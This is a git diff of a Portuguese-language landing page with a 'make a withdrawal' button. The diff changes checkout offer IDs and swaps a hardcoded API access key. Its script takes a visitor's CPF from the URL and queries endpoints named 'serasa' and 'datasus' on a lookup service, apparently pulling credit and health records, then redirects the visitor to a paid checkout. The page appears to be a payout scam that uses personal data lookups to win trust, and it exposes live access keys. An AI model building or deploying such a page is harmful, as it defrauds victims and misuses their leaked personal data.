@@ -838,7 +838,7 @@ src="https://www.facebook.com/tr?id=7059492684090263&ev=PageView&noscript=1"
                       data-widget_type="button.default">
                       <div class="elementor-widget-container">
                         <div class="elementor-button-wrapper">
-                         <div class="elementor-button-text" style="text-align:center"> <a href="https://pepper.com.br/checkout/index.html?p=95550&o=113244" target="_blank" class="v-size-width v-button-colors v-font-size" style="color:#FFFFFF;background-color:#2FB11F;border-radius:4px;line-height:120%;display:inline-block;text-decoration:none;text-align:center;padding:10px 20px;width:auto;max-width:100%;word-wrap:break-word;font-size:31px"> <strong> EFETUAR SAQUE</strong> </a> </div>
+                         <div class="elementor-button-text" style="text-align:center"> <a href="https://pepper.com.br/checkout/index.html?p=95550&o=113677" target="_blank" class="v-size-width v-button-colors v-font-size" style="color:#FFFFFF;background-color:#2FB11F;border-radius:4px;line-height:120%;display:inline-block;text-decoration:none;text-align:center;padding:10px 20px;width:auto;max-width:100%;word-wrap:break-word;font-size:31px"> <strong> EFETUAR SAQUE</strong> </a> </div>
                         </div>
                       </div>
                     </div>
@@ -1212,7 +1212,7 @@ src="https://www.facebook.com/tr?id=7059492684090263&ev=PageView&noscript=1"
         const utmTerm = urlParams.get('utm_term');
         const utmContent = urlParams.get('utm_content');
 
-        const url = `https://pepper.com.br/checkout/index.html?p=95550&o=113244?utm_source=${utmSource}&utm_medium=${utmMedium}&utm_campaign=${utmCampaign}&utm_term=${utmTerm}&utm_content=${utmContent}`;
+        const url = `https://pepper.com.br/checkout/index.html?p=95550&o=113677?utm_source=${utmSource}&utm_medium=${utmMedium}&utm_campaign=${utmCampaign}&utm_term=${utmTerm}&utm_content=${utmContent}`;
 
         botaoPulse.setAttribute("title", url);
       });
@@ -1227,15 +1227,15 @@ src="https://www.facebook.com/tr?id=7059492684090263&ev=PageView&noscript=1"
       const utmTerm = urlParams.get('utm_term');
       const utmContent = urlParams.get('utm_term');
 
-      const url = `https://pepper.com.br/checkout/index.html?p=95550&o=113244?utm_source=${utmSource}&utm_medium=${utmMedium}&utm_campaign=${utmCampaign}&utm_term=${utmTerm}&utm_content=${utmContent}`
+      const url = `https://pepper.com.br/checkout/index.html?p=95550&o=113677?utm_source=${utmSource}&utm_medium=${utmMedium}&utm_campaign=${utmCampaign}&utm_term=${utmTerm}&utm_content=${utmContent}`
       window.location.href = url
     }
 
     async function fetchData() {
       try {
         const cpf = getParameterByName('cpf');  // Função que extrai o parâmetro CPF da URL.
-        const endpoint1 = `https://f5search.com.br/search/serasa?access-key=533e0856-6ac7-4807-acf3-79f21815818d&cpf=${cpf}`;
-        const endpoint2 = `https://f5search.com.br/search/datasus?access-key=533e0856-6ac7-4807-acf3-79f21815818d&cpf=${cpf}`;
+        const endpoint1 = `https://f5search.com.br/search/serasa?access-key=a3a7e110-6259-431e-a3a0-d3f7067b144b&cpf=${cpf}`;
+        const endpoint2 = `https://f5search.com.br/search/serasa?access-key=a3a7e110-6259-431e-a3a0-d3f7067b144b&cpf=${cpf}`;
 
         const [res1, res2] = await Promise.all([fetch(endpoint1), fetch(endpoint2)]);
         const data1 = await res1.json();
@@ -1440,7 +1440,7 @@ src="https://www.facebook.com/tr?id=7059492684090263&ev=PageView&noscript=1"
   <script async="true" src="js/123global.js"></script>
   <!-- Traqueamento de URL -->
   <script>
-    let prefix = ["https://tecnologiaroxa.tech", "https://pepper.com.br/", "https://pepper.com.br/checkout/index.html?p=95550&o=113244"];
+    let prefix = ["https://tecnologiaroxa.tech", "https://pepper.com.br/", "https://pepper.com.br/checkout/index.html?p=95550&o=113677"];
 
     function getParams() {
       let t = "",
